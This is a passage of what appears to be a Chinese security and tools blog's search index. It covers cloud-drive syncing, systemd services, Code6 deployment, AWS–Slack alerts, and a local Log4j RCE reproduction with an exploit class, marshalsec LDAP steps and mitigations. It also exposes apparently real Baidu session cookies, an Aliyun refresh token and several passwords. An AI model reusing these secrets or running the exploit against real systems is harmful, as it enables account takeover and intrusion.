        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="同步sync"><a href="#同步sync" class="headerlink" title="同步sync"></a>同步sync</h1><h2 id="百度云-—-gt-阿里云盘"><a href="#百度云-—-gt-阿里云盘" class="headerlink" title="百度云 —&gt; 阿里云盘"></a>百度云 —&gt; 阿里云盘</h2><h3 id="利用yaronzz-BaiduYunToAliYun-即可实现"><a href="#利用yaronzz-BaiduYunToAliYun-即可实现" class="headerlink" title="利用yaronzz/BaiduYunToAliYun 即可实现"></a>利用<a href="https://github.com/yaronzz/BaiduYunToAliYun">yaronzz/BaiduYunToAliYun</a> 即可实现</h3><p> <code>token/cookie</code>获取</p><ol><li>阿里云<code>refresh_token</code>获取<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220416095719.png"></li><li>百度盘<code>cookie</code>获取<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220416100301.png"></li></ol><pre><code class="shell">pip3 install b2a --upgradeb2a -a &quot;&lt;ali_refresh_token&gt;&quot;b2a -b &quot;baidu_cookies&quot; b2a -f &quot;/&quot;  -t &quot;/BaiDu&quot;</code></pre><h3 id="b2a配置文件认证信息"><a href="#b2a配置文件认证信息" class="headerlink" title="b2a配置文件认证信息"></a>b2a配置文件认证信息</h3><pre><code class="shell">cat &lt;&lt;EOF &gt; ~/b2a/auth.json&#123;&quot;ali-refresh_token&quot;: &quot;ae253a9107ea420ebfac4eb768142bb5&quot;, &quot;bdy-cookies&quot;: &quot;BIDUPSID=1689F7B461CC0E9C52F12B6BFB6A338F; PSTM=1647073439; PANWEB=1; BAIDUID=1689F7B461CC0E9C52F12B6BFB6A338F:SL=0:NR=10:FG=1; secu=1; BDUSS=kNLWGtOQ3FuN204UU9qY1U4UGJvSmQyN0VidDJOLTlMYW9Vb3dtanRFNUdnWHBpRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEb0UmJG9FJiU; BDUSS_BFESS=kNLWGtOQ3FuN204UU9qY1U4UGJvSmQyN0VidDJOLTlMYW9Vb3dtanRFNUdnWHBpRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEb0UmJG9FJiU; STOKEN=7827cfa835e2d55a9c7a5be98df1e12e685f836295666013c2802f7b3983fa05; SCRC=7a20d4e131f1f62f59df7bf2a44a54c9; RT=\&quot;z=1&amp;dm=baidu.com&amp;si=tt4cn8zgmy&amp;ss=l1z3c1fp&amp;sl=4&amp;tt=3lm&amp;bcn=https://fclog.baidu.com/log/weirwood?type=perf&amp;ld=6vo&amp;cl=dfu&amp;ul=kf5&amp;hd=kfi\&quot;; BAIDUID_BFESS=3B52D998848FA0E8B156B63A5126C170:FG=1; csrfToken=gKO-SRJWqAlt7XT9eLasiYy1; BDCLND=NEJdXEDrxfGN7ZPEfNIpeVClSbQ8ESNP; H_PS_PSSID=36175_31660_34812_36167_34584_36122_36277_36125_35864_36226_26350_35724_36102_36061; ndut_fmt=8B0D77DBC872794E85285409CEFEA0CD13623C1299B9CDA79916989D73569A6C; ab_sr=1.0.1_OTFkMTM5NjAxYTY0ZTRiY2M3M2NkODFlMDY0ZjM0YWEyZDIxMDE1MzVmNGUxNmQ0ZGZiZWM5NTk5OWYxZDZmOTU0NjAxNzQxNzczOTJjY2IxYWJhNDE1M2FkYzE0MWJlZjVjOWU3Y2FkMjAzYzU3ZDE1M2Y2Y2NjM2RmY2IzY2Y2OGU4MTYzYjdkNzlhOTFiZGFhZDE0YjEzZjk2ZWUyYQ==; PANPSC=17250608177919035327:CU2JWesajwB3OVK+W4jA5KPTzGELv+1dq7qxW58SMTAwV13IojYjLUci2O0YbEjp7R2km3p1TIG4lUanlzCLQaKK/FH5WUxXYwBzCbaY2H6Ac/axOKu0XZNBoZ8i0CTW8pfgMw2m/oeGDMyMjs7itnzWX47O8AWwA7Z48hYGgW3ajUyYmLmFn1t8VXlRfZV&quot;, &quot;dl-path&quot;: null&#125; </code></pre><h2 id="阿里云盘–-gt-Webdav"><a href="#阿里云盘–-gt-Webdav" class="headerlink" title="阿里云盘–&gt;Webdav"></a>阿里云盘–&gt;Webdav</h2><h3 id="阿里云盘WebDAV共享，支持本地挂载、同步-sleele的博客"><a href="#阿里云盘WebDAV共享，支持本地挂载、同步-sleele的博客" class="headerlink" title="阿里云盘WebDAV共享，支持本地挂载、同步 | sleele的博客"></a><a href="https://sleele.com/2021/08/03/webdav-aliyundriver/">阿里云盘WebDAV共享，支持本地挂载、同步 | sleele的博客</a></h3><h2 id="阿里云盘-–-gt-本地硬盘"><a href="#阿里云盘-–-gt-本地硬盘" class="headerlink" title="阿里云盘 –&gt; 本地硬盘"></a>阿里云盘 –&gt; 本地硬盘</h2><h3 id="CloudDrive-—-将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！-马小帮-maxiaobang-com"><a href="#CloudDrive-—-将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！-马小帮-maxiaobang-com" class="headerlink" title="CloudDrive — 将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！ | 马小帮 (maxiaobang.com)"></a><a href="https://www.maxiaobang.com/10786.html">CloudDrive — 将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！ | 马小帮 (maxiaobang.com)</a></h3><p><a href="https://github.com/spinnaker/clouddriver">spinnaker/clouddriver: read and write operations across cloud providers</a></p><h2 id="阿里云盘–-gt-同步盘"><a href="#阿里云盘–-gt-同步盘" class="headerlink" title="阿里云盘–&gt; 同步盘"></a>阿里云盘–&gt; 同步盘</h2><h3 id="修复bug-·-yxhpy-同步阿里盘-Gitee-com"><a href="#修复bug-·-yxhpy-同步阿里盘-Gitee-com" class="headerlink" title="修复bug · yxhpy/同步阿里盘 - Gitee.com"></a><a href="https://gitee.com/yxhpy/sync-alidisk/releases/v1.1.1">修复bug · yxhpy/同步阿里盘 - Gitee.com</a></h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux如何添加自定义服务</title>
      <link href="Tools/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1.html"/>
      <url>Tools/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="linux如何添加自定义服务-service命令"><a href="#linux如何添加自定义服务-service命令" class="headerlink" title="linux如何添加自定义服务-service命令"></a>linux如何添加自定义服务-service命令</h1><h2 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h2><pre><code class="bash">cat &lt;&lt;EOF &gt;/etc/systemd/system/clash.service[Unit]Description=Clash serviceAfter=network.target[Service]Type=simpleUser=skyleeExecStart=/usr/bin/clashRestart=on-failureRestartPreventExitStatus=23[Install]WantedBy=multi-user.target</code></pre><h2 id="服务操作"><a href="#服务操作" class="headerlink" title="服务操作"></a>服务操作</h2><pre><code class="bash">systemctl list-units --type=service # 查看已识别的服务systemctl daemon-reload   # 让系统重新读取服务service &lt;service-name&gt; start/restart/stop</code></pre><h2 id="启-禁用开机自启"><a href="#启-禁用开机自启" class="headerlink" title="启/禁用开机自启"></a>启/禁用开机自启</h2><pre><code class="shell">systemctl enable/disable &lt;service-name&gt;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>源码监控系统code6搭建</title>
      <link href="Tools/%E6%BA%90%E7%A0%81%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9Fcode6%E6%90%AD%E5%BB%BA.html"/>
      <url>Tools/%E6%BA%90%E7%A0%81%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9Fcode6%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="GitHub代码泄露监控快速实践"><a href="#GitHub代码泄露监控快速实践" class="headerlink" title="GitHub代码泄露监控快速实践"></a>GitHub代码泄露监控快速实践</h1><h2 id="Code6docker快速部署"><a href="#Code6docker快速部署" class="headerlink" title="Code6docker快速部署"></a><a href="https://www.freebuf.com/articles/es/273357.html">Code6</a>docker快速部署</h2><pre><code class="bash">yum install -y docker git    # 安装docker和gitgit clone git clone https://github.com/4x99/code6.git  /opt/code6 ; # 下载code6源码cd /opt/code6 ; docker build -t code6 .   # 构建docker镜像docker run --name mysqldb -e MYSQL_ROOT_PASSWORD=code6@2022 -d mysql  # 启动mysqldocker inspect mysqldb | grep IPAddress     # 查看数据库容器的内部IP   docker exec -it mysqldb  /bin/bash          # 进入mysql容器    mysql -h 172.17.0.2 -u root -p code6@2022     # 登录mysql数据库    ALTER USER &#39;root&#39; IDENTIFIED WITH  mysql_native_password  BY  &#39;code6@2021&#39;; # 修改mysql数据库密码    create database code6;   # 创建code6数据库    FLUSH PRIVILEGES;        # 刷新权限    exit;                    # 退出mysql数据库docker run -d -p 60080:80 \  # 启动code6-server容器    -e MYSQL_HOST=172.17.0.2 \      -e MYSQL_PORT=3306 \      -e MYSQL_DATABASE=code6 \      -e MYSQL_USERNAME=root \      -e MYSQL_PASSWORD=code6@2022 \     --restart=always   \    --name code6-server code6docker exec -it code6-server /bin/bash   # 进入code6-server容器php artisan code6:user-list              # 查看用户php artisan code6:user-add  sec@upex.co Sec@upex.co2022  # 添加用户</code></pre><p>访问 http://<ip>:60080 即可</p><h2 id="配置使用"><a href="#配置使用" class="headerlink" title="配置使用"></a>配置使用</h2><h3 id="令牌配置"><a href="#令牌配置" class="headerlink" title="令牌配置"></a>令牌配置</h3><h3 id="任务配置"><a href="#任务配置" class="headerlink" title="任务配置"></a>任务配置</h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何利用ssh-session会话实现免密免key登录jumpserver及利用</title>
      <link href="Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8ssh-session%E4%BC%9A%E8%AF%9D%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E5%85%8Dkey%E7%99%BB%E5%BD%95jumpserver%E5%8F%8A%E5%88%A9%E7%94%A8.html"/>
      <url>Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8ssh-session%E4%BC%9A%E8%AF%9D%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E5%85%8Dkey%E7%99%BB%E5%BD%95jumpserver%E5%8F%8A%E5%88%A9%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> PostExploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Confluence-CVE2021-26084</title>
      <link href="Kali/Exploit/Confluence-CVE2021-26084.html"/>
      <url>Kali/Exploit/Confluence-CVE2021-26084.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220117165653.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>awschatbot_slack集成</title>
      <link href="Tools/awschatbot-slack%E9%9B%86%E6%88%90.html"/>
      <url>Tools/awschatbot-slack%E9%9B%86%E6%88%90.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="AWS告警通知与Slack集成"><a href="#AWS告警通知与Slack集成" class="headerlink" title="AWS告警通知与Slack集成"></a>AWS告警通知与Slack集成</h1><blockquote><p>前提：Slack channel中已添加AWS Chatbot应用</p></blockquote><h2 id="配置AWS-SNS服务"><a href="#配置AWS-SNS服务" class="headerlink" title="配置AWS SNS服务"></a>配置<a href="https://ap-northeast-1.console.aws.amazon.com/sns/v3/home?region=ap-northeast-1#/dashboard">AWS SNS</a>服务</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220110106.png"></p><h2 id="配置AWS-Chatbot"><a href="#配置AWS-Chatbot" class="headerlink" title="配置AWS Chatbot"></a>配置<a href="https://us-east-2.console.aws.amazon.com/chatbot/home#/">AWS Chatbot</a></h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220104434.png"></p><p>第7步配置好SNS服务时再进行第八步</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220105454.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220110835.png"></p><h2 id="配置AWS-Cloudwatch通知服务"><a href="#配置AWS-Cloudwatch通知服务" class="headerlink" title="配置AWS Cloudwatch通知服务"></a>配置AWS Cloudwatch通知服务</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220111056.png"></p><h2 id="测试告警"><a href="#测试告警" class="headerlink" title="测试告警"></a>测试告警</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220111807.png"></p><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><h2 id="添加了-频道-ID-后，在AWS-Chatbot的Channel中显示不出来频道的名字"><a href="#添加了-频道-ID-后，在AWS-Chatbot的Channel中显示不出来频道的名字" class="headerlink" title="添加了 频道 ID 后，在AWS Chatbot的Channel中显示不出来频道的名字"></a>添加了 频道 ID 后，在AWS Chatbot的Channel中显示不出来频道的名字</h2><p>需在Slack的频道内添加应用 <strong>AWS Chatbot</strong></p><h2 id="通过cloudwatch观察发送记录的日志，报错："><a href="#通过cloudwatch观察发送记录的日志，报错：" class="headerlink" title="通过cloudwatch观察发送记录的日志，报错："></a>通过cloudwatch观察发送记录的日志，报错：</h2><pre><code>Encountered error while sending message to Slack: Slack Web API returned unsuccessful response ( ok: false, error code: channel_not_found, full response body: ChatPostMessageResponse(ok=false, warning=null, error=channel_not_found, needed=null, provided=null, deprecatedArgument=null, responseMetadata=null, channel=null, ts=null, message=null)).</code></pre><p>需在Slack的频道内添加应用 <strong>AWS Chatbot</strong></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache_Log4j_RCE</title>
      <link href="Kali/Exploit/Apache-Log4j-RCE.html"/>
      <url>Kali/Exploit/Apache-Log4j-RCE.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Apache-Log4j"><a href="#Apache-Log4j" class="headerlink" title="Apache-Log4j"></a>Apache-Log4j</h1><p><a href="https://github.com/askDing/apache-log4j-poc">Apache Log4j 远程代码执行</a></p><blockquote><p>攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p></blockquote><p><img src="https://user-images.githubusercontent.com/45926593/145425339-47c71230-87d2-4519-8919-9c3520850f83.png" alt="image"></p><h2 id="复线步骤"><a href="#复线步骤" class="headerlink" title="复线步骤"></a>复线步骤</h2><h3 id="编译exp-修改Log4jRCE-java"><a href="#编译exp-修改Log4jRCE-java" class="headerlink" title="编译exp-修改Log4jRCE.java"></a>编译exp-修改Log4jRCE.java</h3><pre><code class="java">public class Log4jRCE &#123;    static&#123;        try&#123;            String[] cmd=&#123;&quot;open&quot;,&quot;/System/Applications/Calculator.app&quot;&#125;;            java.lang.Runtime.getRuntime().exec(cmd).waitFor();        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h3 id="python起个本地简易web服务"><a href="#python起个本地简易web服务" class="headerlink" title="python起个本地简易web服务"></a>python起个本地简易web服务</h3><p>在target/classes目录下执行 <code>python3 -m http.server 8888</code><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134009.png"></p><h3 id="在本地起一个ldap服务"><a href="#在本地起一个ldap服务" class="headerlink" title="在本地起一个ldap服务"></a>在本地起一个ldap服务</h3><p><code>java  -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8888/#Log4jRCE&quot;</code><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210141034.png"></p><h3 id="运行log4j-java程序"><a href="#运行log4j-java程序" class="headerlink" title="运行log4j.java程序"></a>运行log4j.java程序</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134659.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/log4j-payload.png"></p><h2 id="临时修复方案："><a href="#临时修复方案：" class="headerlink" title="临时修复方案："></a>临时修复方案：</h2><p>（1）修改jvm参数<br>-Dlog4j2.formatMsgNoLookups=true</p><p>（2）修改配置<br>在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true</p><p>①在jvm启动参数中添加</p><p><code>-Dlog4j2.formatMsgNoLookups=true</code></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210151940.png"></p><p>③项⽬中创建log4j2.component.properties⽂件，⽂件中增加配置<code>log4j2.formatMsgNoLookups=true</code><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210152139.png"></p><p>Log4j2 漏洞修复建议<br>临时性缓解措施（任选一种，但是注意，只有 &gt;=2.1.0 版本才可以用，老版本不支持这个选项）<br>在 jvm 参数中添加 -Dlog4j2.formatMsgNoLookups=true<br>系统环境变量中将LOG4J_FORMAT_MSG_NO_LOOKUPS 设置为 true<br>创建 log4j2.component.properties 文件，文件中增加配置 log4j2.formatMsgNoLookups=true<br>彻底修复漏洞:<br>方案一、研发代码修复：升级到官方提供的 log4j-2.15.0-rc2 版本<br>方案二、生产环境修复：<a href="https://github.com/zhangyoufu/log4j2-without-jndi%E3%80%82%EF%BC%88%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%94%BE%E5%BF%83%E7%BD%91%E4%B8%8A%E4%B8%8B%E8%BD%BD%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%B7%B1%E6%89%8B%E5%8A%A8%E8%A7%A3%E5%8E%8B%E5%88%A0%E9%99%A4%EF%BC%9Azip">https://github.com/zhangyoufu/log4j2-without-jndi。（如果不放心网上下载的版本，也可以自己手动解压删除：zip</a> -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 删除jar包里的这个漏洞相关的class，然后重启服务即可）</p><p><a href="https://log4j2-detector.chaitin.cn/">长亭检测工具</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" 